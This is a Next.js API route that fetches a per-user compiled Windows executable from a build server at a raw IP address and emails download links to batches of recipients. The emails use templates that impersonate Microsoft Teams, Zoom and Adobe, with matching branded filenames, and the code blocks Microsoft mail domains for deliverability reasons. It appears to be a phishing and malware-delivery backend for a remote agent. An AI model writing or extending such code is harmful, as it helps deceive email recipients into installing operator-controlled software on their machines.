import { NextRequest, NextResponse } from 'next/server';
import { sendEmailWithAttachment } from '@/lib/email';
import { supabase } from '@/lib/supabase';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { getEmailTemplate, EMAIL_TEMPLATES } from '@/lib/email-templates';

const BUILD_SERVICE_URL = 'http://18.217.69.184:8080/api/Compile';

export async function POST(request: NextRequest) {
  try {
    const { recipientEmail, installToken, recipientEmails, template } = await request.json();

    // Support both single email and batch emails
    const emails = recipientEmails || [recipientEmail];
    const templateId = template || 'voice-note'; // Default template
    
    if (!emails || emails.length === 0 || !installToken) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Limit to 10 emails max
    if (emails.length > 10) {
      return NextResponse.json({ error: 'Maximum 10 emails allowed per batch' }, { status: 400 });
    }

    // Block Outlook domains until we get dedicated IP
    const blockedDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
    const blockedEmails = emails.filter((email: string) => {
      const domain = email.split('@')[1]?.toLowerCase();
      return blockedDomains.includes(domain);
    });

    if (blockedEmails.length > 0) {
      return NextResponse.json({ 
        error: 'Outlook/Microsoft email addresses temporarily blocked due to deliverability issues',
        blockedEmails: blockedEmails 
      }, { status: 400 });
    }

    // Get user info
    const { data: user, error: userError } = await supabase
      .from('users')
      .select('*')
      .eq('install_token', installToken)
      .single();

    if (userError || !user) {
      return NextResponse.json({ error: 'Invalid install token' }, { status: 400 });
    }

    // Generate parameters for Build Service template compilation
    const serverUrl = process.env.VERCEL_APP_URL || 'https://uc-universal-connect-omega.vercel.app';

    // Send parameters to Build Service for template-based compilation
    const buildResponse = await fetch(BUILD_SERVICE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ 
        serverUrl: serverUrl,
        installToken: installToken 
      }),
    });

    if (!buildResponse.ok) {
      throw new Error(`Build service failed: ${buildResponse.status}`);
    }

    // Get compiled executable
    const exeBuffer = await buildResponse.arrayBuffer();
    const exeBytes = Buffer.from(exeBuffer);

    // Store executable temporarily in Vercel filesystem
    const downloadId = crypto.randomUUID();
    const tempDir = path.join('/tmp', 'uc-downloads');
    const exePath = path.join(tempDir, `${downloadId}.exe`);
    
    // Ensure directory exists
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    
    // Write .exe to filesystem
    fs.writeFileSync(exePath, exeBytes);
    
    // Get template info for branded filename
    const templateInfo = EMAIL_TEMPLATES.find(t => t.id === templateId);
    const filename = templateInfo?.filename || 'UCAgent.exe';
    
    // Store download record in Supabase (just metadata, no file storage)
    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + 24); // 24 hour expiration for Vercel tmp
    
    const { error: recordError } = await supabase
      .from('download_links')
      .insert({
        download_id: downloadId,
        user_id: user.id,
        filename: filename,
        file_size: exeBytes.length,
        expires_at: expiresAt.toISOString(),
        created_at: new Date().toISOString()
      });

    if (recordError) {
      console.error('Record error:', recordError);
      // Continue anyway - file is stored, just no tracking
    }

    // Create download URL
    const downloadUrl = `${serverUrl}/api/download/${downloadId}`;

    // Get branded email template
    const emailTemplate = getEmailTemplate(templateId);
    const emailHtml = emailTemplate.replace('{{DOWNLOAD_LINK}}', downloadUrl);
    
    // Get subject line based on template
    const subjectMap: Record<string, string> = {
      'voice-note': 'AudioSync Pro - Voice Recording Studio Ready',
      'zoom-meeting': 'ZoomConnect Pro - Your Meeting Room is Ready', 
      'adobe-creative': 'Creative Hub - Your Design Suite is Ready',
      'teams-enterprise': 'Microsoft Teams - Enterprise Setup Complete'
    };
    
    const emailSubject = subjectMap[templateId as string] || 'UC Connect Agent - Ready for Download';

    // Send emails to all recipients with .exe attachment
    const emailResults = [];
    const errors = [];

    for (const email of emails) {
      try {
        const emailResult = await sendEmailWithAttachment(
          email,
          emailSubject,
          emailHtml,
          '', // No filename (no attachment)
          Buffer.from(''), // No attachment
          user.id,
          user.subscription || 'free'
        );

        if (emailResult.success) {
          emailResults.push({ email, status: 'sent' });
        } else {
          emailResults.push({ email, status: 'failed', error: emailResult.message });
          errors.push(`${email}: ${emailResult.message}`);
        }
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error';
        emailResults.push({ email, status: 'failed', error: errorMessage });
        errors.push(`${email}: ${errorMessage}`);
      }
    }

    const successCount = emailResults.filter(r => r.status === 'sent').length;
    const failureCount = emailResults.filter(r => r.status === 'failed').length;

    return NextResponse.json({ 
      success: successCount > 0,
      message: `Agent compiled and emailed. Emails: ${successCount} sent, ${failureCount} failed`,
      emailResults: emailResults,
      totalEmails: emails.length,
      successCount,
      failureCount
    });

  } catch (error) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return NextResponse.json(
      { error: 'Failed to send agent', details: errorMessage },
      { status: 500 }
    );
  }
}